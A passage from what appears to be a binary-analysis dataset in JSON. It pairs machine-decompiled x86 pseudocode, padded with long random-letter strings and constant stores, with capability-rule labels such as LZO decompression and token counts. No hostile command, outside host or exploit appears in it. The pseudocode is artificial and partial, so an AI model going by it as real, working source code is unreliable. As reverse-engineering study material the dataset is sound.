var_12ch = puVar1 + -100;\n    var_128h = puVar1 + -0x20;\n    *(puVar1 + -0x68) = \"fgredrghbcwvsegfqvuslkgcwmyskfqzszruuwsmssgjtshxsnqjuglfrpedtpgmdirqxytnuvlqmomwxzr\";\n    *(puVar1 + -0x6c) = 0x440a62;\n    fcn.00401e79(*(puVar1 + -0x68));\n    var_10h = 8;\n    *(puVar1 + -0x6c) = \"xcfi\";\n    *(puVar1 + -0x70) = 0x440a87;\n    fcn.00401e79(*(puVar1 + -0x6c));\n    piVar4 = var_12ch;\n    *var_12ch = &fcn.004402c0::var_b0h;\n    piVar4[2] = 0x40e4cec0;\n    piVar4[1] = 0;\n    piVar4[10] = 0x40d728c0;\n    piVar4[9] = 0;\n    piVar4[0xc] = 0x40bba400;\n    piVar4[0xb] = 0;\n    piVar4[0xe] = 0x40cf6c00;\n    piVar4[0xd] = 0;\n    piVar4[0x10] = 0x40b51e00;\n    piVar4[0xf] = 0;\n    *(piVar4 + 0x17) = 0;\n    piVar4[0x18] = 0x107c;\n    var_10h = 2;\n    *(puVar1 + -0x70) = 0x440afd;\n    fcn.00401bd1(*(puVar1 + -0x6c));\n    puVar2 = var_130h;\n    *(var_130h + -4) = 0x440b15;\n    fcn.00403b02();\n    var_13ch = puVar2;\n    var_138h = puVar2 + -0x70;\n    var_134h = puVar2 + -0x20;\n    *(puVar2 + -0x74) = \"asdvigijancomnqbbibiakxoyemqdgphfnqjwxeysoxoroikawelweskdgvkmxx\";\n    *(puVar2 + -0x78) = 0x440b43;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_140h = var_138h + 0x38;\n    var_10h = 6;\n    *(puVar2 + -0x78) = \"siaerxba\";\n    *(puVar2 + -0x7c) = 0x440b6e;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_10h = 7;\n    *(puVar2 + -0x7c) = \"oebiotahkixzrajfajaxugzleqpwbmozmocqjckwumcfqb\";\n    *(puVar2 + -0x80) = 0x440b93;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    puVar1 = var_138h;\n    *var_138h = 1;\n    *(puVar1 + 8) = 0x40e23ec0;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0x10) = 0x40e4c5a0;\n    *(puVar1 + 0xc) = 0;\n    *(puVar1 + 0x18) = 0x40ed1f40;\n    *(puVar1 + 0x14) = 0;\n    *(puVar1 + 0x1c) = 0x293;\n    puVar1[0x68] = 0;\n    *(puVar1 + 0x6c) = 0xa74;\n    var_10h = 2;\n    *(puVar2 + -0x80) = 0x440bef;\n    fcn.00405975(*(puVar2 + -0x7c));\n    puVar1 = var_13ch;\n    var_148h = var_13ch;\n    *(var_13ch + -4) = var_13ch;\n    var_144h = puVar1 + -0x2c;\n    *(puVar1 + -0x30) = \"nqdyorphfynpecoeubx\";\n    *(puVar1 + -0x34) = 0x440c25;\n    fcn.00401e79(*(puVar1 + -0x30));\n    puVar3 = var_144h;\n    var_144h[1] = 0x40d3de40;\n    *puVar3 = 0;\n    puVar3[2] = 0x36f;\n    *(puVar3 + 3) = 0;\n    puVar3[4] = 0x5bd;\n    *(puVar1 + -0x34) = 0x440c5a;\n    fcn.004022b1(*(puVar1 + -0x30));\n    puVar2 = var_148h;\n    var_154h = var_148h;\n    *(var_148h + -4) = var_148h;\n    var_150h = puVar2 + -0x6c;\n    var_14ch = puVar2 + -0x1c;\n    *(puVar2 + -0x70) = \"vlzgcfbejzynhxaagiepyziyyyzpewplurmffuog\";\n    *(puVar2 + -0x74) = 0x440c91;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_158h = var_150h + 0x20;\n    var_10h = 4;\n    *(puVar2 + -0x74) = \"efpkunqjiysmkhvbjgptudiwihlykdgkmasxszmhkwovmbsuoabrqnlguesowwtuugyvbhcjjcvarrdrurrlrb\";\n    *(puVar2 + -0x78) = 0x440cbc;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_10h = 5;\n    *(puVar2 + -0x78) =\n         \"cynghpkbernrohhwmaqgedepdgceutymibaqkytucoslsbmzgikaqumswwmizeqcacndlqqjtvzwhbltozpifgxeiyxhbjvqef\";\n    *(puVar2 + -0x7c) = 0x440ce1;\n    fcn.00401e79(*(puVar2 + -0x78));\n    puVar1 = var_150h;\n    *var_150h = 1;\n    puVar1[4] = 1;\n    *(puVar1 + 0x3c) = 0x40e9fd00;\n    *(puVar1 + 0x38) = 0;\n    *(puVar1 + 0x40) = 0x5b5;\n    *(puVar1 + 0x44) = 0x755;\n    *(puVar1 + 0x4c) = 0x40d6e5c0;\n    *(puVar1 + 0x48) = 0;\n    puVar1[0x68] = 0;\n    var_10h = 2;\n    *(puVar2 + -0x7c) = 0x440d33;\n    fcn.00403d78(*(puVar2 + -0x78));\n    puVar1 = var_154h;\n    var_160h = var_154h;\n    *(var_154h + -4) = var_154h;\n    var_15ch = puVar1 + -0x30;\n    *(puVar1 + -0x34) = \"tbuuymywongowgrhakkzrwtluzcnjstwnyqqxmdrbeoctvdqrva\";\n    *(puVar1 + -0x38) = 0x440d69;\n    fcn.00401e79(*(puVar1 + -0x34));\n    puVar3 = var_15ch;\n    *var_15ch = 0xbcf;\n    puVar3[2] = 0x40b1ff00;\n    puVar3[1] = 0;\n    *(puVar3 + 3) = 0;\n    puVar3[4] = 0x5e9;\n    *(puVar3 + 5) = 0;\n    *(puVar1 + -0x38) = 0x440da2;\n    fcn.00405b73(*(puVar1 + -0x34));\n    puVar2 = var_160h;\n    var_16ch = var_160h;\n    *(var_160h + -4) = var_160h;\n    var_168h = puVar2 + -0x54;\n    var_164h = puVar2 + -0x18;\n    *(puVar2 + -0x58) =\n         \"kueupbkmbnrxzczvvmhlksxgazkxlvmtvlwqscewoadfhqwymwugyztvxueiizumxrveojuidrpvifvjblrxqlpmwsszmwouxsjw\";\n    *(puVar2 + -0x5c) = 0x440dde;\n    fcn.00401e79(*(puVar2 + -0x58));\n    var_10h = 3;\n    *(puVar2 + -0x5c) = \"fyhjpcvozeuw\";\n    *(puVar2 + -0x60) = 0x440e03;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    puVar1 = var_168h;\n    *var_168h = 1;\n    *(puVar1 + 8) = 0x40d0e040;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0xc) = 0xef6;\n    *(puVar1 + 0x28) = 0x184;\n    *(puVar1 + 0x30) = 0x40c59000;\n    *(puVar1 + 0x2c) = 0;\n    *(puVar1 + 0x34) = 0xad4;\n    *(puVar1 + 0x38) = 0x11be;\n    var_10h = 2;\n    *(puVar2 + -0x60) = 0x440e5b;\n    fcn.00402f9a(*(puVar2 + -0x5c));\n    *in_FS_OFFSET = var_18h;\n    return var_c4h;\n}\n",
        "token_count": 7781
    },
    "00442a00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00442a00(int32_t param_1)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uchar auStack404 [36];\n    uint uStack368;\n    uint *var_168h;\n    uint *var_164h;\n    uchar *var_160h;\n    uint *var_15ch;\n    uchar *var_158h;\n    uchar *var_154h;\n    int32_t *var_150h;\n    uchar *var_14ch;\n    uchar *var_148h;\n    uchar *var_144h;\n    uchar *var_140h;\n    uint *var_13ch;\n    uchar *var_138h;\n    uchar *var_134h;\n    uint *var_130h;\n    uchar *var_12ch;\n    uchar *var_128h;\n    int32_t *var_124h;\n    uchar *var_120h;\n    uint *var_11ch;\n    uchar *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    uchar *var_100h;\n    uchar *var_fch;\n    int32_t *var_f8h;\n    int32_t *var_f4h;\n    int32_t *var_f0h;\n    uchar *var_ech;\n    int32_t *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    int32_t *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uchar *var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    uint *var_b8h;\n    uchar *var_b4h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar7;\n    uchar *puVar8;\n    \n    var_1ch = &fcn.00442a00::var_168h;\n    var_b8h = &fcn.00442a00::var_168h;\n    var_10h = 0xffffffff;\n    var_14h = 0x451060;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00442a00::var_18h;\n    var_c4h = param_1 + 4;\n    uStack368 = 0x442a4c;\n    var_c0h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_bch = var_c0h + 0x1c;\n    uStack368 = 0x442a60;\n    fcn.004040a7();\n    var_b4h = &stack0xfffffe6c;\n    var_10h = 1;\n    arg_8h = \"qvethcytvkosewkfgikozzluxubiefqqxbgvravgataskliqvcbzfklgujbvddxpbnrffrvircnvix\";\n    fcn.00401e79(\"qvethcytvkosewkfgikozzluxubiefqqxbgvravgataskliqvcbzfklgujbvddxpbnrffrvircnvix\");\n    puVar2 = var_b4h;\n    *(var_b4h + 0x1c) = 0x40f1e1e0;\n    *(puVar2 + 0x18) = 0;\n    *(puVar2 + 0x24) = 0x40c1fc00;\n    *(puVar2 + 0x20) = 0;\n    fcn.00401ad2(arg_8h);\n    puVar4 = var_b8h;\n    var_d0h = var_b8h;\n    *(var_b8h + -4) = var_b8h;\n    var_cch = puVar4 + -0x58;\n    var_c8h = puVar4 + -0x28;\n    *(puVar4 + -0x5c) = \"qgkefebazxw\";\n    *(puVar4 + -0x60) = 0x442af5;\n    fcn.00401e79(*(puVar4 + -0x5c));\n    var_d4h = var_cch + 0x18;\n    var_10h = 0xf;\n    *(puVar4 + -0x60) = \"hofokwxho\";\n    *(puVar4 + -100) = 0x442b20;\n    fcn.00401e79(*(puVar4 + -0x60));\n    var_10h = 0x10;\n    *(puVar4 + -100) = \"ccpoqmrufouapuinmidumrpzwoyoypxgzzgpzivjvzofepapnsr\";\n    *(puVar4 + -0x68) = 0x442b42;\n    fcn.00401e79(*(puVar4 + -100));\n    puVar2 = var_cch;\n    *(var_cch + 0x48) = 0x28b;\n    *(puVar2 + 0x50) = 0x40d996c0;\n    *(puVar2 + 0x4c) = 0;\n    puVar2[0x54] = 0;\n    var_10h = 1;\n    *(puVar4 + -0x68) = 0x442b78;\n    fcn.004041fb(*(puVar4 + -100));\n    puVar2 = var_d0h;\n    var_d8h = var_d0h + -0x20;\n    puVar5 = var_d0h + -0x20;\n    *(var_d0h + -0x20) = &fcn.00442a00::var_38h;\n    *(puVar2 + -0x10) = 0x40c9e800;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -4) = 0x4d5;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0xc) = 1;\n    *(puVar2 + -0x18) = 0x1492;\n    *(puVar2 + -0x1c) = 0x6d6;\n    *(puVar2 + -0x24) = 0x442bd3;\n    fcn.00406352(*puVar5, *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), \n                 *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x24) = 0x442be0;\n    fcn.00403b02();\n    var_e0h = puVar2 + -0x3c;\n    *(puVar2 + -0x24) = 0x40d22fc0;\n    *(puVar2 + -0x28) = 0;\n    *(puVar2 + -0x38) = 0x40cfb900;\n    *(puVar2 + -0x3c) = 0;\n    *(puVar2 + -0x2c) = 0x8ed;\n    *(puVar2 + -0x30) = 0xe80;\n    *(puVar2 + -0x34) = 1;\n    *(puVar2 + -0x40) = 0x442c20;\n    fcn.00404ecb(*(puVar2 + -0x3c), *(puVar2 + -0x38), *(puVar2 + -0x34), *(puVar2 + -0x30), *(puVar2 + -0x2c), \n                 *(puVar2 + -0x28));\n    *(puVar2 + -0x40) = puVar2 + -0x3c;\n    var_dch = puVar2 + -0x74;\n    *(puVar2 + -0x78) = \"uieijwhm\";\n    *(puVar2 + -0x7c) = 0x442c4e;\n    fcn.00401e79(*(puVar2 + -0x78));\n    piVar3 = var_dch;\n    *var_dch = &fcn.00442a00::var_50h;\n    piVar3[8] = 0x40e48bc0;\n    piVar3[7] = 0;\n    *(piVar3 + 9) = 0;\n    piVar3[10] = 0x1752;\n    *(piVar3 + 0xb) = 0;\n    piVar3[0xd] = 0x40c0ab80;\n    piVar3[0xc] = 0;\n    *(puVar2 + -0x7c) = 0x442c94;\n    fcn.00402702(*(puVar2 + -0x78));\n    puVar2 = var_e0h;\n    *(var_e0h + -4) = 0x442ca9;\n    fcn.00403b02();\n    var_ech = puVar2 + -0x1c;\n    *(puVar2 + -4) = 0x40cae880;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0x14) = 0x40c32b00;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0xc) = 0x11b1;\n    *(puVar2 + -0x10) = 0x247;\n    *(puVar2 + -0x1c) = 1;\n    *(puVar2 + -0x20) = 0x442ce9;\n    fcn.00405f06(*(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), \n                 *(puVar2 + -8));\n    var_e8h = puVar2 + -0x98;\n    var_e4h = puVar2 + -0x38;\n    *(puVar2 + -0x9c) = \"tlfqjhfqfwekpwwbbmicnatbgricxiranocunulqcenmsuqfjjrmifdyjcghevslygpwszkeage\";\n    *(puVar2 + -0xa0) = 0x442d17;\n    fcn.00401e79(*(puVar2 + -0x9c));\n    var_f0h = var_e8h + 0x12;\n    var_10h = 0xc;\n    *(puVar2 + -0xa0) = \"jgmqjbmowbjfdoknhslxiahfpxojlpoehjivbpyscrcamaqeozknh\";\n    *(puVar2 + -0xa4) = 0x442d42;\n    fcn.00401e79(*(puVar2 + -0xa0));\n    var_f4h = var_e8h + 9;\n    var_10h = 0xd;\n    *(puVar2 + -0xa4) = \"hhlshbusvmmlsommjxurypqmkzedwwxxnqjjckqacmrnqktktbuadtazidxkttqeuytikuzmhtsp\";\n    *(puVar2 + -0xa8) = 0x442d6d;\n    fcn.00401e79(*(puVar2 + -0xa4));\n    var_10h = 0xe;\n    *(puVar2 + -0xa8) = \"cdjxwleafdyasbucmjcgse\";\n    *(puVar2 + -0xac) = 0x442d92;\n    fcn.00401e79(*(puVar2 + -0xa8));\n    piVar3 = var_e8h;\n    *var_e8h = &fcn.00442a00::var_68h;\n    *(piVar3 + 7) = 0;\n    *(piVar3 + 8) = 0;\n    *(piVar3 + 0xf) = 1;\n    piVar3[0x10] = 0x1239;\n    piVar3[0x11] = 0x800;\n    piVar3[0x1e] = 0x4d7;\n    var_10h = 1;\n    *(puVar2 + -0xac) = 0x442dd5;\n    fcn.004061f4(*(puVar2 + -0xa8));\n    puVar2 = var_ech;\n    *(var_ech + -4) = 0x442dea;\n    fcn.00403b02();\n    var_fch = puVar2 + -0x1c;\n    *(puVar2 + -8) = 0x40a8a000;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 0x409f2000;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -4) = 0x62c;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x1c) = 0x490;\n    *(puVar2 + -0x20) = 0x442e2a;\n    fcn.00405e4d(*(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), \n                 *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x20) = puVar2 + -0x1c;\n    var_f8h = puVar2 + -0x48;\n    *(puVar2 + -0x4c) = \"umcpwctuoinnffzduurtpjgxzxgpgiickcizkiaufvhvovvnhslinexxekbtkpd\";\n    *(puVar2 + -0x50) = 0x442e58;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    piVar3 = var_f8h;\n    *var_f8h = &fcn.00442a00::var_80h;\n    piVar3[7] = 0xea0;\n    piVar3[8] = 0x770;\n    piVar3[10] = 0x40e37740;\n    piVar3[9] = 0;\n    *(puVar2 + -0x50) = 0x442e8f;\n    fcn.00403a53(*(puVar2 + -0x4c));\n    puVar4 = var_fch;\n    *(var_fch + -4) = 0x442ea4;\n    fcn.00403b02();\n    var_108h = puVar4;\n    var_104h = puVar4 + -0x60;\n    var_100h = puVar4 + -0x30;\n    *(puVar4 + -100) = \"moulsfsmsrgnqytjeisxwwcvtvyndcpweknntf\";\n    *(puVar4 + -0x68) = 0x442ed2;\n    fcn.00401e79(*(puVar4 + -100));\n    var_10ch = var_104h + 0x18;\n    var_10h = 10;\n    *(puVar4 + -0x68) = \"jsbcfgjt\";\n    *(puVar4 + -0x6c) = 0x442efd;\n    fcn.00401e79(*(puVar4 + -0x68));\n    var_10h = 0xb;\n    *(puVar4 + -0x6c) = \"aoophhgljqbkmzbvufkuglmaqndmhxiupkclbcwsjexvjhwemdw\";\n    *(puVar4 + -0x70) = 0x442f1f;\n    fcn.00401e79(*(puVar4 + -0x6c));\n    puVar2 = var_104h;\n    *(var_104h + 0x4c) = 0x40ec9520;\n    *(puVar2 + 0x48) = 0;\n    *(puVar2 + 0x50) = 0x17ab;\n    *(puVar2 + 0x54) = 0x66f;\n    puVar2[0x58] = 0;\n    *(puVar2 + 0x5c) = 0xae2;\n    *(puVar4 + -0x70) = 0x442f5c;\n    fcn.00405371(*(puVar4 + -0x6c));\n    puVar2 = var_108h;\n    var_118h = var_108h;\n    *(var_108h + -4) = var_108h;\n    var_114h = puVar2 + -0x30;\n    var_110h = puVar2 + -0x18;\n    var_10h = 1;\n    *(puVar2 + -0x34) = \"xyljdzlukewbqardawwmpzuhdgqrdflejibauqhjuaeqfxxhpgaxomwisurmyrmxxanuczhsmdbijpfexn\";\n    *(puVar2 + -0x38) = 0x442f9a;\n    fcn.00401e79(*(puVar2 + -0x34));\n    var_10h = 9;\n    *(puVar2 + -0x38) = \"jsemkuhhqzutjwweyojsfpytlljauvkpagvcpellahxujrfyffwaljulpnglmlxurwlntkfmalalq\";\n    *(puVar2 + -0x3c) = 0x442fbc;\n    fcn.00401e79(*(puVar2 + -0x38));\n    *(puVar2 + -0x3c) = 0x442fcc;\n    fcn.00405137(*(puVar2 + -0x38));\n    puVar2 = var_118h;\n    var_120h = var_118h;\n    *(var_118h + -4) = var_118h;\n    var_11ch = puVar2 + -0x28;\n    var_10h = 1;\n    *(puVar2 + -0x2c) = \"alukbsznriliwnvutfalswrilforqocirkn\";\n    *(puVar2 + -0x30) = 0x443004;\n    fcn.00401e79(*(puVar2 + -0x2c));\n    puVar1 = var_11ch;\n    var_11ch[1] = 0x40bf6200;\n    *puVar1 = 0;\n    *(puVar1 + 8) = 0;\n    *(puVar1 + 9) = 0;\n    *(puVar2 + -0x30) = 0x44302f;\n    fcn.00405001(*(puVar2 + -0x2c));\n    puVar2 = var_120h;\n    var_128h = var_120h;\n    *(var_120h + -4) = var_120h;\n    var_124h = puVar2 + -0x50;\n    *(puVar2 + -0x54) = \"yxuuozuleslfsubjuedzmjgadkenabhgcdyoegqnhuhkdlalkltbgordgbsncnlbutuqnbmpnpspzhdlx\";\n    *(puVar2 + -0x58) = 0x443065;\n    fcn.00401e79(*(puVar2 + -0x54));\n    piVar3 = var_124h;\n    *var_124h = &fcn.00442a00::var_98h;\n    piVar3[2] = 0x40bf5600;\n    piVar3[1] = 0;\n    piVar3[3] = 0xfc6;\n    piVar3[4] = 0xeb7;\n    piVar3[6] = 0x40b2da00;\n    piVar3[5] = 0;\n    piVar3[8] = 0x40e7c460;\n    piVar3[7] = 0;\n    piVar3[10] = 0x40e82260;\n    piVar3[9] = 0;\n    piVar3[0xb] = 0xb7d;\n    piVar3[0xc] = 0x10fa;\n    piVar3[0x13] = 0xcc5;\n    *(puVar2 + -0x58) = 0x4430de;\n    fcn.004041ba(*(puVar2 + -0x54));\n    puVar2 = var_128h;\n    *(var_128h + -4) = 0x4430f6;\n    fcn.00403b02();\n    var_138h = puVar2 + -0x24;\n    var_134h = puVar2 + -0x24;\n    *(puVar2 + -8) = 0x40d66300;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x18) = 0x40b3d100;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0x20) = 0x40ce8d00;\n    *(puVar2 + -0x24) = 0;\n    *(puVar2 + -4) = 0;\n    *(puVar2 + -0x10) = 0xe96;\n    *(puVar2 + -0x14) = 0xa1b;\n    *(puVar2 + -0x28) = 0x44314a;\n    fcn.00401a5a(*(puVar2 + -0x24), *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), \n                 *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    var_130h = puVar2 + -0x7c;\n    var_12ch = puVar2 + -0x48;\n    *(puVar2 + -0x80) = \"trdbhnmrhkhsznwlnfndlsxmwilcbyrdnuepdsxw\";\n    *(puVar2 + -0x84) = 0x443178;\n    fcn.00401e79(*(puVar2 + -0x80));\n    var_13ch = var_130h + 7;\n    var_10h = 7;\n    *(puVar2 + -0x84) = \"ckgfaasmvcedsybdbzitnsegbkjbockemoqgzqnaunfehfxvjljgjnyzxtzymrbxklabyvaqdn\";\n    *(puVar2 + -0x88) = 0x4431a3;\n    fcn.00401e79(*(puVar2 + -0x84));\n    var_10h = 8;\n    *(puVar2 + -0x88) = \"uoxuhijcgub\";\n    *(puVar2 + -0x8c) = 0x4431c8;\n    fcn.00401e79(*(puVar2 + -0x88));\n    puVar1 = var_130h;\n    *var_130h = 0x89c;\n    puVar1[0x14] = 0x40edc520;\n    puVar1[0x13] = 0;\n    *(puVar1 + 0x15) = 0;\n    var_10h = 1;\n    *(puVar2 + -0x8c) = 0x4431fd;\n    fcn.0040609b(*(puVar2 + -0x88));\n    puVar4 = var_134h;\n    var_148h = var_134h;\n    *(var_134h + -4) = var_134h;\n    var_144h = puVar4 + -0x50;\n    var_140h = puVar4 + -0x28;\n    *(puVar4 + -0x54) = \"nzuwietjegnvmyqlmqfnrahstzxqksf\";\n    *(puVar4 + -0x58) = 0x443239;\n    fcn.00401e79(*(puVar4 + -0x54));\n    var_10h = 6;\n    *(puVar4 + -0x58) = \"uhqjnbjuhbixhrdpuvuxbargppwuxqswymakhaacbwfbscinzafytbhqemxsrniaigczxbyvwj\";\n    *(puVar4 + -0x5c) = 0x44325e;\n    fcn.00401e79(*(puVar4 + -0x58));\n    puVar2 = var_144h;\n    *var_144h = 0;\n    *(puVar2 + 0x1c) = 0x5fb;\n    puVar2[0x20] = 0;\n    puVar2[0x24] = 1;\n    puVar2[0x40] = 0;\n    *(puVar2 + 0x44) = 0x9db;\n    *(puVar2 + 0x48) = 0x30d;\n    puVar2[0x4c] = 1;\n    var_10h = 1;\n    *(puVar4 + -0x5c) = 0x4432a3;\n    fcn.00403710(*(puVar4 + -0x58));\n    puVar2 = var_148h;\n    puVar6 = var_148h + -0x18;\n    puVar7 = var_148h + -0x18;\n    var_154h = var_148h + -0x18;\n    puVar8 = var_148h + -0x18;\n    *(var_148h + -4) = 0x21d;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0xc) = 0x125;\n    *(puVar2 + -0x10) = 0xed;\n    *(puVar2 + -0x14) = 0x68;\n    *puVar6 = 0;\n    *(puVar2 + -0x1c) = 0x4432eb;\n    fcn.00404d54(*puVar7, *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x1c) = puVar8;\n    var_150h = puVar2 + -0x70;\n    var_14ch = puVar2 + -0x3c;\n    *(puVar2 + -0x74) = \"gxxpjrhvzjaopdyxsejtbmdkvokjyinlvbnxieohd\";\n    *(puVar2 + -0x78) = 0x443321;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_10h = 5;\n    *(puVar2 + -0x78) = \"qifkdzsamillnyqdursatvvhrtertzlijyflbncclfnjsesshhjqyievdezsgxgmcdwgwzhcgobvagqndzuwcbjemu\";\n    *(puVar2 + -0x7c) = 0x443346;\n    fcn.00401e79(*(puVar2 + -0x78));\n    piVar3 = var_150h;\n    *var_150h = &fcn.00442a00::var_b0h;\n    *(piVar3 + 7) = 1;\n    piVar3[9] = 0x40d16d00;\n    piVar3[8] = 0;\n    piVar3[10] = 0xeb;\n    piVar3[0xc] = 0x40e36f40;\n    piVar3[0xb] = 0;\n    piVar3[0x13] = 0x77b;\n    piVar3[0x14] = 0xd33;\n    *(piVar3 + 0x15) = 0;\n    var_10h = 1;\n    *(puVar2 + -0x7c) = 0x4433a4;\n    fcn.004045ac(*(puVar2 + -0x78));\n    puVar2 = var_154h;\n    *(var_154h + -4) = 0x4433bc;\n    fcn.00403b02();\n    var_160h = puVar2;\n    var_15ch = puVar2 + -0x70;\n    var_158h = puVar2 + -0x18;\n    *(puVar2 + -0x74) = \"hqcyitlqlmwglyqfiwindefhhtccritp\";\n    *(puVar2 + -0x78) = 0x4433ea;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_164h = var_15ch + 0x10;\n    var_10h = 2;\n    *(puVar2 + -0x78) = \"crarqrurmugcccgdguioydvscxznikb\";\n    *(puVar2 + -0x7c) = 0x443415;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_168h = var_15ch + 9;\n    var_10h = 3;\n    *(puVar2 + -0x7c) = \"ciunjyxxesebtihjwdimrfddldiujqifsozueklgdhyhmwtwkpwczwcvidquf\";\n    *(puVar2 + -0x80) = 0x443440;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    var_10h = 4;\n    *(puVar2 + -0x80) = \"phuanlxpqpegmei\";\n    *(puVar2 + -0x84) = 0x443465;\n    fcn.00401e79(*(puVar2 + -0x80));\n    puVar1 = var_15ch;\n    *var_15ch = 0x20da;\n    *(puVar1 + 7) = 1;\n    *(puVar1 + 8) = 1;\n    *(puVar1 + 0xf) = 1;\n    var_10h = 1;\n    *(puVar2 + -0x84) = 0x443494;\n    fcn.00405489(*(puVar2 + -0x80));\n    *in_FS_OFFSET = var_18h;\n    return var_c0h;\n}\n",
        "token_count": 7325
    },
    "004447e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.004447e0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar8;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    int32_t aiStack292 [12];\n    uchar auStack244 [28];\n    uint uStack216;\n    uchar *var_d0h;\n    uint *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    uint *var_b0h;\n    uint *var_ach;\n    uchar *var_a8h;\n    uint *var_a4h;\n    uchar *var_a0h;\n    uchar *var_9ch;\n    int32_t *var_98h;\n    uchar *var_94h;\n    uchar *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uchar *var_84h;\n    uchar *var_80h;\n    uchar *var_7ch;\n    uchar *var_78h;\n    uchar *var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    uint *var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint *var_5ch;\n    int32_t *var_58h;\n    uchar *var_54h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    uchar *puVar7;\n    uint *puVar9;\n    uchar *puVar10;\n    \n    var_1ch = &fcn.004447e0::var_d0h;\n    var_5ch = &fcn.004447e0::var_d0h;\n    var_10h = 0xffffffff;\n    var_14h = 0x451160;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004447e0::var_18h;\n    var_60h = param_1 + 4;\n    uStack216 = 0x444826;\n    var_64h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_58h = &stack0xfffffedc;\n    var_54h = &stack0xffffff0c;\n    var_10h = 0;\n    fcn.00401e79(\"mirzjdqlmktqnwptvbbnqmqqztwxwwfgjypv\");\n    var_10h = 0xb;\n    arg_8h = \"qgodjy\";\n    fcn.00401e79(\"qgodjy\");\n    piVar4 = var_58h;\n    *var_58h = &fcn.004447e0::var_38h;\n    piVar4[1] = 0xa46;\n    piVar4[3] = 0x40df4580;\n    piVar4[2] = 0;\n    *(piVar4 + 4) = 0;\n    *(piVar4 + 0xb) = 1;\n    piVar4[0x12] = 0xba9;\n    *(piVar4 + 0x13) = 0;\n    var_10h = 0;\n    fcn.00403ffd(arg_8h);\n    puVar1 = var_5ch;\n    *(var_5ch + -4) = 0x4448ca;\n    fcn.00403b02();\n    var_6ch = puVar1;\n    var_68h = puVar1 + -0x2c;\n    *(puVar1 + -0x30) = 0x54f64b;\n    *(puVar1 + -0x34) = 0x4448ec;\n    fcn.00401e79(*(puVar1 + -0x30));\n    puVar3 = var_68h;\n    var_68h[1] = 0x40c93900;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 1;\n    *(puVar3 + 3) = 0;\n    *(puVar3 + 